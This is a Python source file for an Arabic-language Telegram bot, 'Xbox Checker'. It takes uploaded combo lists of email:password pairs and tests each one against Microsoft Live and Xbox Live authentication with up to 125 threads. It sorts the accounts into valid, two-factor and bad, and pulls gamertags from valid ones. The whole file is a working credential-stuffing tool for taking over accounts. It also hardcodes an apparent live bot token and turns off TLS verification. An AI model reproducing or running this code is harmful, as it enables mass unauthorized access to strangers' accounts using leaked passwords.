import os
import re
import time
import threading
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import urllib3
from http.server import HTTPServer, BaseHTTPRequestHandler

urllib3.disable_warnings()

# التوكن الخاص بك
BOT_TOKEN = "8920692173:AAFQPb5rqonlngMmha9EEN7QktgDazml78Y"

bot = telebot.TeleBot(BOT_TOKEN)
_TIMEOUT = (10, 15)

busy_users = set()
active_scans = {}
user_settings = {}
file_lock = threading.Lock()

# --- سيرفر الويب لفتح المنفذ لمنصة Render ---
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running successfully!")

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
    server.serve_forever()

threading.Thread(target=run_web_server, daemon=True).start()
# ---------------------------------------------

TRANSLATIONS = {
    "ar": {
        "welcome": "# WELCOME TO {bot_name} #\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📬 أرسل ملف الكومبو الخاص بك (.txt)\n︙ التنسيق: mail:pass (سطر لكل حساب)\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– 📊 لوحة التحكم الخاصة بك:\n︙ الثريدز: {threads} / {max_threads}\n︙ الخطة: {plan}\n︙ الأيام المتبقية: ∞ (مدى الحياة)\n︙ الحد اليومي: غير محدود (Unlimited)\n︙ الوضع: 🎮 {mode}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n– ◎ اختر خياراً من القائمة أدناه:",
        "settings_title": "⚙️ **إعدادات البوت**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nاختر الإعداد الذي تريد تعديله:",
        "stats": "📊 **إحصائياتك:**\n- إجمالي العمليات: غير محدود\n- الحالة: نشط وجاهز للفحص",
        "membership_msg": "💎 **معلومات العضوية:**\n- الخطة الحالية: {plan}\n- الصلاحية: مدى الحياة (Unlimited)",
        "support_msg": "📞 **الدعم الفني:**\nلأي مساعدة، تواصل مع المسؤول عبر الأزرار أو القناة.",
        "referrals_msg": "🔗 **نظام الإحالات:**\nقم بمشاركة بوتك مع أصدقائك.",
        "rewards_msg": "🎁 **المكافآت:**\nلا توجد مكافآت معلقة حالياً.",
        
        "btn_stats": "📊 الإحصائيات",
        "btn_referrals": "🔗 الإحالات",
        "btn_rewards": "🎁 المكافآت",
        "btn_membership": "💎 العضوية",
        "btn_support": "📞 الدعم",
        "btn_settings": "⚙️ الإعدادات",
        
        "btn_change_lang": "🌐 تغيير اللغة (EN/TR/AR)",
        "btn_change_name": "🏷️ تغيير اسم البوت",
        "btn_api_mode": "📡 وضع الـ API",
        "btn_set_threads": "🧵 تعيين الثريدز",
        "btn_change_plan": "💎 تغيير الخطة",
        "btn_main_menu": "🔙 القائمة الرئيسية",
        "btn_back": "🔙 رجوع"
    }
}

def get_user_config(chat_id):
    if chat_id not in user_settings:
        user_settings[chat_id] = {
            "bot_name": "Xbox Checker",
            "threads": 125,
            "max_threads": 125,
            "mode": "Xbox",
            "plan": "💎 VIP (Unlimited)",
            "lang": "ar",
            "link_mode": False,
            "channel_send": False,
        }
    return user_settings[chat_id]


class XboxChecker:
    LOGIN_URL = (
        "https://login.live.com/oauth20_authorize.srf"
        "?client_id=00000000402B5328"
        "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
        "&scope=service::user.auth.xboxlive.com::MBI_SSL"
        "&display=touch&response_type=token&locale=en"
    )

    def _session(self):
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        return s

    def _extract_token(self, url):
        try:
            fragment = urlparse(url).fragment
            if not fragment and "#" in url:
                fragment = url.split("#", 1)[1]
            params = parse_qs(fragment)
            return params.get("access_token", [None])[0]
        except:
            return None

    def check(self, email, password):
        try:
            session = self._session()
            r1 = session.get(self.LOGIN_URL, timeout=_TIMEOUT)
            sftag_m = re.search(r'value="(.+?)"', r1.text) or re.search(r'value=\\"(.+?)\\"', r1.text)
            url_post_m = re.search(r'"urlPost":"(.+?)"', r1.text)
            if not sftag_m or not url_post_m:
                return {"status": "BAD"}
            sftag = sftag_m.group(1)
            url_post = url_post_m.group(1).replace("\\/", "/")

            r2 = session.post(
                url_post,
                data={"login": email, "loginfmt": email, "passwd": password, "PPFT": sftag},
                timeout=_TIMEOUT,
                allow_redirects=True,
            )

            ms_token = None
            if r2 and "access_token" in r2.url:
                ms_token = self._extract_token(r2.url)
            else:
                r2_lower = r2.text.lower() if r2 else ""
                if any(x in r2_lower for x in ["incorrect account", "password is incorrect", "doesn't exist", "no account found"]) or (r2 and re.search(r'sErrorCode.*?"50126"', r2.text)):
                    return {"status": "BAD"}
                if r2 and ("identity/confirm" in r2.url or "two-step verification" in r2_lower):
                    return {"status": "2FA"}
                if r2 and ("/Abuse" in r2.url or "suspended" in r2_lower):
                    return {"status": "BAD"}

                form_action_m = re.search(r'<form[^>]*action="([^"]+)"', r2.text) if r2 else None
                if form_action_m:
                    action = form_action_m.group(1)
                    hidden = {}
                    for m in re.finditer(r'<input[^>]+>', r2.text, re.I):
                        inp = m.group()
                        if "hidden" in inp.lower():
                            n = re.search(r'name="([^"]+)"', inp)
                            v = re.search(r'value="([^"]*)"', inp)
                            if n:
                                hidden[n.group(1)] = v.group(1) if v else ""
                    r3 = session.post(action, data=hidden, timeout=_TIMEOUT, allow_redirects=True)
                    if r3 and "access_token" in r3.url:
                        ms_token = self._extract_token(r3.url)

                if not ms_token:
                    return {"status": "BAD"}

            r_xbl = session.post(
                "https://user.auth.xboxlive.com/user/authenticate",
                json={
                    "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT",
                },
                timeout=_TIMEOUT,
            )
            if not r_xbl or r_xbl.status_code != 200:
                return {"status": "FREE", "data": {}}
            
            xbl_data = r_xbl.json()
            xbl_token = xbl_data["Token"]
            uhs = xbl_data["DisplayClaims"]["xui"][0]["uhs"]

            r_xsts = session.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json={
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                    "RelyingParty": "http://xboxlive.com",
                    "TokenType": "JWT",
                },
                timeout=_TIMEOUT,
            )
            
            gamertag = ""
            gamerscore = 0
            if r_xsts and r_xsts.status_code == 200:
                xsts_token = r_xsts.json()["Token"]
                xbl_auth = f"XBL3.0 x={uhs};{xsts_token}"
                r_prof = session.get(
                    "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore",
                    headers={"Authorization": xbl_auth, "x-xbl-contract-version": "2"},
                    timeout=_TIMEOUT,
                )
                if r_prof and r_prof.status_code == 200:
                    settings = r_prof.json().get("profileUsers", [{}])[0].get("settings", [])
                    for s in settings:
                        if s.get("id") == "Gamertag":
                            gamertag = s.get("value", "")
                        elif s.get("id") == "Gamerscore":
                            try:
                                gamerscore = int(s.get("value", 0))
                            except:
                                pass

            data = {"gamertag": gamertag, "gamerscore": gamerscore}
            return {"status": "FREE", "data": data}

        except Exception as e:
            return {"status": "BAD"}


def send_main_menu(chat_id, message_id=None):
    config = get_user_config(chat_id)
    lang = config["lang"]
    t = TRANSLATIONS[lang]
    
    welcome_text = t["welcome"].format(
        bot_name=config["bot_name"],
        threads=config["threads"],
        max_threads=config["max_threads"],
        plan=config["plan"],
        mode=config["mode"]
    )
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(t["btn_stats"], callback_data="stats"),
        InlineKeyboardButton(t["btn_referrals"], callback_data="referrals"),
        InlineKeyboardButton(t["btn_rewards"], callback_data="rewards"),
        InlineKeyboardButton(t["btn_membership"], callback_data="membership"),
        InlineKeyboardButton(t["btn_support"], callback_data="support"),
        InlineKeyboardButton(t["btn_settings"], callback_data="settings")
    )
    
    if message_id:
        try:
            bot.edit_message_text(welcome_text, chat_id=chat_id, message_id=message_id, reply_markup=markup)
        except:
            bot.send_message(chat_id, welcome_text, reply_markup=markup)
    else:
        bot.send_message(chat_id, welcome_text, reply_markup=markup)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    send_main_menu(message.chat.id)


@bot.message_handler(commands=['queue'])
def check_queue(message):
    chat_id = message.chat.id
    if chat_id in active_scans:
        scan = active_scans[chat_id]
        bot.reply_to(message, f"📊 حالة الفحص: {scan['checked']} / {scan['total']}")
    else:
        bot.reply_to(message, "⚠️ لا توجد عملية فحص جارية حالياً.")


@bot.message_handler(commands=['stop'])
def stop_checker(message):
    chat_id = message.chat.id
    if chat_id in active_scans:
        active_scans[chat_id]["stop"] = True
        bot.reply_to(message, "🛑 جاري إيقاف الفحص وإرسال النتائج...")
    else:
        bot.reply_to(message, "⚠️ لا توجد عملية فحص جارية حالياً.")


# --- معالج الأزرار التفاعلية (Callback Query Handler) ---
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    config = get_user_config(chat_id)
    lang = config["lang"]
    t = TRANSLATIONS[lang]

    if call.data == "stats":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t["btn_back"], callback_data="main_menu"))
        bot.edit_message_text(t["stats"], chat_id=chat_id, message_id=message_id, reply_markup=markup)
        
    elif call.data == "referrals":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t["btn_back"], callback_data="main_menu"))
        bot.edit_message_text(t["referrals_msg"], chat_id=chat_id, message_id=message_id, reply_markup=markup)

    elif call.data == "rewards":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t["btn_back"], callback_data="main_menu"))
        bot.edit_message_text(t["rewards_msg"], chat_id=chat_id, message_id=message_id, reply_markup=markup)

    elif call.data == "membership":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t["btn_back"], callback_data="main_menu"))
        bot.edit_message_text(t["membership_msg"].format(plan=config["plan"]), chat_id=chat_id, message_id=message_id, reply_markup=markup)

    elif call.data == "support":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t["btn_back"], callback_data="main_menu"))
        bot.edit_message_text(t["support_msg"], chat_id=chat_id, message_id=message_id, reply_markup=markup)

    elif call.data == "settings":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(t["btn_set_threads"], callback_data="set_threads"),
            InlineKeyboardButton(t["btn_back"], callback_data="main_menu")
        )
        bot.edit_message_text(t["settings_title"], chat_id=chat_id, message_id=message_id, reply_markup=markup)

    elif call.data == "set_threads":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t["btn_back"], callback_data="settings"))
        bot.edit_message_text("🧵 الحد الأقصى للثريدز مفعل على 125 (خطة VIP).", chat_id=chat_id, message_id=message_id, reply_markup=markup)

    elif call.data == "main_menu":
        send_main_menu(chat_id, message_id)

    elif call.data == "stop_scan":
        if chat_id in active_scans:
            active_scans[chat_id]["stop"] = True
            bot.answer_callback_query(call.id, "🛑 تم إيقاف الفحص.")
        else:
            bot.answer_callback_query(call.id, "⚠️ لا يوجد فحص نشط حالياً.")

    try:
        bot.answer_callback_query(call.id)
    except:
        pass


@bot.message_handler(content_types=['document'])
def handle_file(message):
    chat_id = message.chat.id
    
    with file_lock:
        if chat_id in busy_users:
            bot.reply_to(message, "⚠️ لديك عملية فحص تعمل بالفعل، انتظر حتى تنتهي أو قم بإيقافها.")
            return
        busy_users.add(chat_id)

    config = get_user_config(chat_id)

    try:
        file_name = message.document.file_name if message.document.file_name else "Combo.txt"
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        combos = []
        for line in downloaded_file.decode("utf-8", errors="ignore").splitlines():
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                combos.append((parts[0].strip(), parts[1].strip()))

        if not combos:
            bot.reply_to(message, "الملف فارغ أو التنسيق غير صحيح. تأكد من أن الأسطر بصيغة email:pass")
            busy_users.discard(chat_id)
            return

        active_scans[chat_id] = {
            "checked": 0, "total": len(combos), "hits": 0,
            "free": 0, "two_fa": 0, "bad": 0, "error": 0, "stop": False
        }

        total = len(combos)
        max_workers = config["threads"]
        start_time = time.time()

        controls_markup = InlineKeyboardMarkup()
        controls_markup.add(InlineKeyboardButton("🛑 Stop", callback_data="stop_scan"))

        status_msg = bot.reply_to(
            message,
            f"𖠵 📊 Scanning... 🔄 𖥻\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"➪ 📁 File: `{file_name[:20]}`\n"
            f"➪ 📊 Processed: `0 / {total}`\n"
            f"➪ 🧵 Threads: `{max_workers}`\n"
            f"➪ 📡 Mode: 🎮 `{config['mode']}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ HITS: `0`\n"
            f"🆓 FREE: `0`\n"
            f"🔐 2FA: `0`\n"
            f"❌ BAD: `0`\n"
            f"⚠️ ERROR: `0`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=controls_markup,
            parse_mode="Markdown"
        )

        checker = XboxChecker()
        lock = threading.Lock()

        def process_combo(email, password):
            if chat_id not in active_scans or active_scans[chat_id]["stop"]:
                return
            
            result = checker.check(email, password)
            
            with lock:
                if chat_id not in active_scans:
                    return
                active_scans[chat_id]["checked"] += 1
                checked = active_scans[chat_id]["checked"]
                status = result.get("status")

                if status == "PREMIUM":
                    active_scans[chat_id]["hits"] += 1
                elif status == "FREE":
                    active_scans[chat_id]["free"] += 1
                elif status == "2FA":
                    active_scans[chat_id]["two_fa"] += 1
                elif status == "BAD":
                    active_scans[chat_id]["bad"] += 1
                else:
                    active_scans[chat_id]["error"] += 1

                if checked % 10 == 0 or checked == total:
                    try:
                        scan_d = active_scans[chat_id]
                        bot.edit_message_text(
                            f"𖠵 📊 Scanning... 🔄 𖥻\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"➪ 📁 File: `{file_name[:20]}`\n"
                            f"➪ 📊 Processed: `{checked} / {total}`\n"
                            f"➪ 🧵 Threads: `{max_workers}`\n"
                            f"➪ 📡 Mode: 🎮 `{config['mode']}`\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"✅ HITS: `{scan_d['hits']}`\n"
                            f"🆓 FREE: `{scan_d['free']}`\n"
                            f"🔐 2FA: `{scan_d['two_fa']}`\n"
                            f"❌ BAD: `{scan_d['bad']}`\n"
                            f"⚠️ ERROR: `{scan_d['error']}`\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                            chat_id=chat_id, message_id=status_msg.message_id,
                            reply_markup=controls_markup, parse_mode="Markdown"
                        )
                    except:
                        pass

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(process_combo, p[0], p[1]) for p in combos]
            for f in as_completed(futures):
                if chat_id not in active_scans or active_scans[chat_id]["stop"]:
                    break

        elapsed_time = max(int(time.time() - start_time), 1)
        scan_data = active_scans.get(chat_id, {"checked": 0, "hits": 0, "free": 0, "two_fa": 0, "bad": 0, "error": 0})
        cpm = int((scan_data["checked"] / elapsed_time) * 60)

        report = (
            f"𖠵 📊 Scan Completed ✅ 𖥻\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"➪ 📁 File: `{file_name[:20]}....`\n"
            f"➪ 📊 Processed: `{scan_data['checked']}/{total}`\n"
            f"➪ 🧵 Threads: `{max_workers}`\n"
            f"➪ 📡 Mode: 🎮 `{config['mode']}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ HITS: `{scan_data['hits']}`\n"
            f"🆓 FREE: `{scan_data['free']}`\n"
            f"🔐 2FA: `{scan_data['two_fa']}`\n"
            f"❌ BAD: `{scan_data['bad']}`\n"
            f"⚠️ ERROR: `{scan_data['error']}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏰ Elapsed: `{elapsed_time} sec`\n"
            f"⚡ CPM: `{cpm}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"☰ — Controls:\n"
            f"︙ /stop - Stop and send results\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        
        try:
            bot.edit_message_text(report, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
        except:
            bot.send_message(chat_id, report, parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"حدث خطأ في النظام: {e}")
    finally:
        busy_users.discard(chat_id)
        active_scans.pop(chat_id, None)


if __name__ == "__main__":
    print("Bot is running with full interactive features...")
    bot.infinity_polling()
